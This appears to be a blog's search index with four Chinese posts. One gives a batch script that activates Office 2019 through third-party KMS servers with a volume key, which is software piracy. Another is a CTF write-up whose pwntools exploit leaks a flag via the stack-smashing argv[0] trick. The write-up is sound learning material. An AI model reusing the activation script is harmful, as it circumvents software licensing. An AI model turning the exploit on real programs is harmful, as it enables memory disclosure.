<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>windows下的shell美化</title>
      <link href="/2019/01/08/windows%E4%B8%8B%E7%9A%84shell%E7%BE%8E%E5%8C%96/"/>
      <url>/2019/01/08/windows%E4%B8%8B%E7%9A%84shell%E7%BE%8E%E5%8C%96/</url>
      <content type="html"><![CDATA[<h1 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h1><p><img src="/2019/01/08/windows下的shell美化/美化shell.png" alt="美化shell"></p>]]></content>
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 折腾 </tag>
            
            <tag> windows </tag>
            
            <tag> 美化 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>激活office2019</title>
      <link href="/2019/01/04/%E6%BF%80%E6%B4%BBoffice2019/"/>
      <url>/2019/01/04/%E6%BF%80%E6%B4%BBoffice2019/</url>
      <content type="html"><![CDATA[<a id="more"></a><p><a href="http://www.heanny.cn/post-371.html" target="_blank" rel="noopener">代码来源</a></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">(cd /d <span class="string">"%~dp0"</span>)&amp;&amp;(NET FILE||(powershell <span class="built_in">start-process</span> -FilePath <span class="string">'%0'</span> -verb runas)&amp;&amp;(<span class="keyword">exit</span> /B)) &gt;NUL <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">title Office <span class="number">2019</span> Activator r/Piracy</span><br><span class="line">echo Converting... &amp; mode <span class="number">40</span>,<span class="number">25</span></span><br><span class="line">(<span class="keyword">if</span> exist <span class="string">"%ProgramFiles%\Microsoft Office\Office16\ospp.vbs"</span> cd /d <span class="string">"%ProgramFiles%\Microsoft Office\Office16"</span>)&amp;(<span class="keyword">if</span> exist <span class="string">"%ProgramFiles(x86)%\Microsoft Office\Office16\ospp.vbs"</span> cd /d <span class="string">"%ProgramFiles(x86)%\Microsoft Office\Office16"</span>)&amp;(<span class="keyword">for</span> /f %%x <span class="keyword">in</span> (<span class="string">'dir /b ..\root\Licenses16\ProPlus2019VL*.xrm-ms'</span>) <span class="keyword">do</span> cscript ospp.vbs /inslic:<span class="string">"..\root\Licenses16\%%x"</span> &gt;nul)&amp;(<span class="keyword">for</span> /f %%x <span class="keyword">in</span> (<span class="string">'dir /b ..\root\Licenses16\ProPlus2019VL*.xrm-ms'</span>) <span class="keyword">do</span> cscript ospp.vbs /inslic:<span class="string">"..\root\Licenses16\%%x"</span> &gt;nul)</span><br><span class="line">cscript //nologo ospp.vbs /unpkey:<span class="number">6</span>MWKP &gt;nul&amp;cscript //nologo ospp.vbs /inpkey:NMMKJ-<span class="number">6</span>RK4F-KMJVX-<span class="number">8</span>D9MJ-<span class="number">6</span>MWKP &gt;nul&amp;set i=<span class="number">1</span></span><br><span class="line">:server</span><br><span class="line"><span class="keyword">if</span> %i%==<span class="number">1</span> set KMS_Sev=kms7.MSGuides.com</span><br><span class="line"><span class="keyword">if</span> %i%==<span class="number">2</span> set KMS_Sev=kms8.MSGuides.com</span><br><span class="line"><span class="keyword">if</span> %i%==<span class="number">3</span> set KMS_Sev=kms9.MSGuides.com</span><br><span class="line">cscript //nologo ospp.vbs /sethst:%KMS_Sev% &gt;nul</span><br><span class="line">echo %KMS_Sev% &amp; echo Activating...</span><br><span class="line">cscript //nologo ospp.vbs /act | find /i <span class="string">"successful"</span> &amp;&amp; (echo Complete) || (echo Trying another KMS Server &amp; set /a i+=<span class="number">1</span> &amp; goto server)</span><br><span class="line">pause &gt;nul</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p>新建一个 txt 文件将代码复制粘贴并修改后缀为 bat 即可双击使用，shell中显示successful后即激活成功。</p>]]></content>
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> office </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>网鼎杯GUESS</title>
      <link href="/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AFGUESS/"/>
      <url>/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AFGUESS/</url>
      <content type="html"><![CDATA[<a id="more"></a><h2 id="1-文件保护"><a href="#1-文件保护" class="headerlink" title="1.文件保护"></a>1.文件保护</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><hr><h2 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2.漏洞分析"></a>2.漏洞分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __WAIT_STATUS stat_loc; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-84h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+30h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> s2[<span class="number">56</span>]; <span class="comment">// [rsp+60h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">3L</span>L;</span><br><span class="line">  LODWORD(stat_loc.__uptr) = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  clean_buf();</span><br><span class="line">  HIDWORD(stat_loc.__iptr) = open(<span class="string">"./flag.txt"</span>, <span class="number">0</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( HIDWORD(stat_loc.__iptr) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"./flag.txt"</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), buf, <span class="number">48u</span>LL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This is GUESS FLAG CHALLENGE!"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"you have no sense... bye :-) "</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = my_fork();</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到输入的地方只有一个<code>gets</code>，因此可以通过gets进行栈溢出，但是进行栈溢出不可避免的会破坏栈上的<code>Canary</code>，从而导致进程终止，因此通过栈溢出劫持程序的做法就不可取了。</p><p>注意到<code>flag</code>是保存在栈上的，而且不会被栈溢出给覆盖，因此我们可以通过一些方式将栈上的数据打印出来从而获得<code>flag</code>，这里就要使用一种针对<code>Canary</code>保护的泄露数据的手段。</p><p>在检测到栈上保存的<code>Canary</code>被修改后会执行<code>___stack_chk_fail()</code>函数，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>) &#123;   </span><br><span class="line">__fortify_fail (<span class="string">"stack smashing detected"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的<code>__fortify_fail()</code>函数源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__fortify_fail (msg)</span><br><span class="line">   <span class="keyword">const</span> <span class="keyword">char</span> *msg; &#123;</span><br><span class="line">      <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line">         <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">              __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>, msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>) </span><br><span class="line">&#125; </span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure><p>这里可以看到打印了<code>__libc_argv[0]</code>，这个变量也是保存在栈上的，也就是我们<code>main</code>函数的第二个参数，通过栈溢出我们可以改写<code>__libc_argv</code>在栈上的数据，进而让<code>__fortify_fail()</code>函数打印出我们想要泄露的地址上的数据。</p><p>前面说过flag是存在栈上的，但是我们并不知道栈的地址，因此我们要想办法泄露出栈地址，再加上到<code>buf</code>的偏移量，通过漏洞将<code>flag</code>打印出来，由于程序没有开启<code>PIE</code>保护，因此我们可以通过泄露<code>environ</code>变量的值得到栈地址。</p><blockquote><p>这里需要提一下，<code>environ</code>是<code>libc</code>中定义的全局变量，同时这个变量也是<code>main</code>函数的第三个参数</p></blockquote><p>既然是<code>libc</code>中的东西，那么地址也需要从<code>libc</code>中得到，也就是说为了获得<code>environ</code>的地址我们需要先获得<code>libc</code>中某个函数的实际地址，通过固定的偏移得到<code>environ</code>地址，而我们需要的函数的实际地址可以通过之前的漏洞得到。</p><blockquote><p>由于延迟绑定技术，所以需要通过<code>got.plt</code>的地址得到函数的实际地址</p></blockquote><p>现在我们的攻击思路是这样的：</p><ol><li>选定目标函数，通过漏洞得到一个目标函数函数的实际地址</li><li>通过偏移量计算出<code>environ</code>变量地址，通过栈溢出漏洞获得栈地址</li><li>通过偏移量和获得的栈地址得到<code>buf</code>的地址，通过漏洞将<code>flag</code>打印出来</li></ol><p>”恰巧“<code>GUESS</code>程序通过<code>fork</code>得到的子进程执行<code>gets</code>，而我们也正好有3次使用漏洞的机会。</p><hr><h2 id="3-准备工作"><a href="#3-准备工作" class="headerlink" title="3.准备工作"></a>3.准备工作</h2><p>在写<code>exp</code>前我们需要选好目标函数并计算目标函数与<code>environ</code>的偏移量、<code>buf</code>与<code>argv</code>之间的偏移量、<code>environ</code>与<code>buf</code>之间的偏移量。</p><p>这里我选择<code>puts</code>函数作为目标函数，使用<code>gdb</code>动态调试得到所需的偏移量。</p><p>由于没有开<code>PIE</code>，因此可以通过<code>IDA</code>轻易地获得<code>puts</code>的<code>got.plt</code>地址：<code>0x602020</code></p><p>通过<code>IDA</code>或者<code>ldd</code>可以轻松地知道<code>GUESS</code>使用的<code>libc</code>是<code>libc.so.6</code>，接着在<code>shell</code>中执行以下代码<code>objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep -E &#39;__environ|_IO_puts&#39;</code>，会得到以下<code>libc</code>偏移量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">000000000006f690 g    DF .text  00000000000001c8  GLIBC_2.2.5 _IO_puts</span><br><span class="line">00000000003c6f38 g    DO .bss   0000000000000008  GLIBC_2.2.5 __environ</span><br></pre></td></tr></table></figure><p>将两个地址相减得到这两个东西之间的偏移量</p><p>在调用<code>gets</code>出下断点，查看寄存器:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RAX: 0x0</span><br><span class="line">RBX: 0x0</span><br><span class="line">RCX: 0x7ffff7b042c0 (&lt;__write_nocancel+7&gt;:      cmp    rax,0xfffffffffffff001)</span><br><span class="line">RDX: 0x7ffff7dd3780 --&gt; 0x0</span><br><span class="line">RSI: 0x7ffff7dd26a3 --&gt; 0xdd3780000000000a</span><br><span class="line">RDI: 0x7fffffffda80 --&gt; 0x1</span><br><span class="line">RBP: 0x7fffffffdac0 --&gt; 0x400bb0 (push   r15)</span><br><span class="line">RSP: 0x7fffffffda20 --&gt; 0x7fffffffdba8 --&gt; 0x7fffffffdf97 (&quot;/home/lazydel/code/vscode/python/GUESS&quot;)</span><br><span class="line">RIP: 0x400b23 (call   0x400830 &lt;gets@plt&gt;)</span><br></pre></td></tr></table></figure><p>其中<code>RDI</code>保存了<code>buf</code>的地址，发现<code>RSP</code>保存了指向<code>argv</code>的指针，即<code>0x7fffffffdba8</code>为<code>argv</code>的地址，可以计算出<code>buf</code>与<code>argv</code>之间的偏移量为<code>0x128</code></p><p>接着在<code>gdb</code>中执行<code>vmmap</code>得到以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Start              End                Perm      Name</span><br><span class="line">0x00400000         0x00401000         r-xp      /home/lazydel/code/vscode/python/GUESS</span><br><span class="line">0x00601000         0x00602000         r--p      /home/lazydel/code/vscode/python/GUESS</span><br><span class="line">0x00602000         0x00603000         rw-p      /home/lazydel/code/vscode/python/GUESS</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p      mapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fd5000 0x00007ffff7fd8000 rw-p      mapped</span><br><span class="line">0x00007ffff7ff7000 0x00007ffff7ffa000 r--p      [vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped</span><br><span class="line">0x00007ffffffdd000 0x00007ffffffff000 rw-p      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]</span><br></pre></td></tr></table></figure><p>可以看到<code>libc</code>基址是<code>0x00007ffff7a0d000</code>，将之前得到的<code>environ</code>偏移量和基址相加得到<code>environ</code>在栈上的地址。</p><p>将得到的两个栈地址相减就得到了<code>environ</code>与<code>buf</code>之间的偏移量：<code>-0x168</code></p><hr><h2 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp"></a>4.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#preparation</span></span><br><span class="line">puts_got = <span class="number">0x602020</span></span><br><span class="line">environ_libc_offset = <span class="number">0x3c6f38</span> - <span class="number">0x6f690</span></span><br><span class="line">buf_offset = <span class="number">-0x168</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x128</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./GUESS'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    p.sendline(payload + p64(addr))</span><br><span class="line">    p.recvuntil(<span class="string">'*** stack smashing detected ***: '</span>)</span><br><span class="line">    <span class="keyword">return</span> u64(p.recv(<span class="number">8</span>)) &amp; <span class="number">0xffffffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">(addr)</span>:</span></span><br><span class="line">    p.sendline(payload + p64(addr))</span><br><span class="line">    p.recvuntil(<span class="string">'*** stack smashing detected ***: '</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'flag is here:'</span> + p.recvuntil(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#leak environ_addr</span></span><br><span class="line">    puts_addr = leak(puts_got)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'puts_addr: %x'</span> % puts_addr</span><br><span class="line"></span><br><span class="line">    <span class="comment">#leak stack_addr</span></span><br><span class="line">    environ_addr = leak(puts_addr + environ_libc_offset)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'environ_addr: %x'</span> % environ_addr</span><br><span class="line"></span><br><span class="line">    getflag(environ_addr+buf_offset)</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>手机ssh连接ubuntu虚拟机</title>
      <link href="/2018/05/21/%E6%89%8B%E6%9C%BAssh%E8%BF%9E%E6%8E%A5ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
      <url>/2018/05/21/%E6%89%8B%E6%9C%BAssh%E8%BF%9E%E6%8E%A5ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
      <content type="html"><![CDATA[<p>由于没有能够随身携带的轻便的笔记本，所以就搞了搞手机ssh连接ubuntu虚拟机。步骤如下：<br><a id="more"></a></p><h2 id="1-ubuntu安装openssh-server"><a href="#1-ubuntu安装openssh-server" class="headerlink" title="1.ubuntu安装openssh-server"></a>1.ubuntu安装openssh-server</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openssh-server</span><br></pre></td></tr></table></figure><h2 id="2-配置ssh服务的端口"><a href="#2-配置ssh服务的端口" class="headerlink" title="2.配置ssh服务的端口"></a>2.配置ssh服务的端口</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>找到Port并修改为你想要的端口号（默认端口号22）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> Package generated configuration file</span><br><span class="line"><span class="meta">#</span> See the sshd_config(5) manpage for details</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> What ports, IPs and protocols we listen for</span><br><span class="line">Port 22</span><br><span class="line"><span class="meta">#</span> Use these options to restrict which interfaces/protocols sshd will bind to</span><br><span class="line"><span class="meta">#</span>ListenAddress ::</span><br><span class="line"><span class="meta">#</span>ListenAddress 0.0.0.0</span><br></pre></td></tr></table></figure><h2 id="3-开启ssh服务"><a href="#3-开启ssh服务" class="headerlink" title="3.开启ssh服务"></a>3.开启ssh服务</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/ssh start</span><br></pre></td></tr></table></figure><h2 id="4-设置vmware网络"><a href="#4-设置vmware网络" class="headerlink" title="4.设置vmware网络"></a>4.设置vmware网络</h2><ol><li><p>设置ubuntu虚拟机网络为net模式，命令行输入命令<code>ifconfig</code>得到虚拟机ip，将ip地址记下</p></li><li><p>编辑-&gt;虚拟网络编辑器-&gt;选中VMnet8-&gt;NET 设置-&gt;添加端口转发规则</p><blockquote><p>注：将虚拟机ip和设置的ssh端口填入，选一个主机端口</p></blockquote><blockquote><p>注：主机端口为宿主机开放的端口，让外部设备能通过宿主机端口转发连接到虚拟机对应端口，因此我们还需要在宿主机的防火墙处开放我们选好的端口</p></blockquote></li></ol><p>由于我的系统是win10，所以我这里只给出win10的方法</p><ol start="3"><li><p><code>Win + x</code>打开菜单，接着按<code>w</code>打开网络连接（这个东西也可以在 设置-&gt;网络 中找到），状态-&gt;Windows 防火墙-&gt;高级设置-&gt;入站规则-&gt;（右侧）新建规则-&gt;端口-&gt;输入选定的端口-&gt;允许连接-&gt;一路下一步完成</p><blockquote><p>注：由于我对防火墙不是很了解，所以我这里选择的是允许连接，没有做什么安全设置，有兴趣的可以自己去收集资料看看</p></blockquote><blockquote><p>注：这一步结束后就可以通过手机ssh连接到ubuntu虚拟机了，不过ssh的host地址需要填宿主机的ip地址</p></blockquote></li></ol><h2 id="5-手机ssh配置"><a href="#5-手机ssh配置" class="headerlink" title="5.手机ssh配置"></a>5.手机ssh配置</h2><p>我的手机是android系统，使用的是termux，为了方便使用termux终端，可以去下载一个程序员使用的键盘</p><p>默认的termux是没有 ssh 和其他软件的，使用倒也方便，有自带的 pkg 包管理器。</p><ol><li><p>下载<code>openssh</code>让手机能够进行<code>ssh</code>连接，下载<code>vim</code>方便修改文件</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pkg install openssh</span><br><span class="line">pkg install vim</span><br></pre></td></tr></table></figure></li><li><p>为了方便手机ssh连接虚拟机，我们可以创建ssh配置文件，通过如下指令创建自己的ssh配置文件</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.ssh/config</span><br></pre></td></tr></table></figure></li></ol><p>为了定制你自己的配置文件，你可以参考<a href="https://linux.die.net/man/5/ssh_config" target="_blank" rel="noopener">配置文件</a></p><p>一般而言我们需要如下格式</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host ssh连接别名</span><br><span class="line">HostName主机地址</span><br><span class="line">Port连接端口</span><br><span class="line">User连接的用户</span><br></pre></td></tr></table></figure><ol start="3"><li><p>接着，为了不用再输入密码，我们通过以下步骤简化</p><ol><li><p>通过命令<code>ssh-keygen</code>生成rsa公钥和私钥</p></li><li><p>通过<code>ssh-copy-id -p port user@hostname</code>将公钥上传至ubuntu虚拟机中</p><blockquote><p>注：port为ssh连接端口，user@hostname为服务器地址</p></blockquote></li></ol></li></ol><p>完成以上步骤后我们只需要在命令行输入<code>ssh ssh连接别名</code>即可完成ssh连接。</p><p>由于水平和时间原因，无法更深入的配置一个更安全方便地ssh，有想法的可以自己查找相关资料继续完善其中的不足之处。</p>]]></content>
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 折腾 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
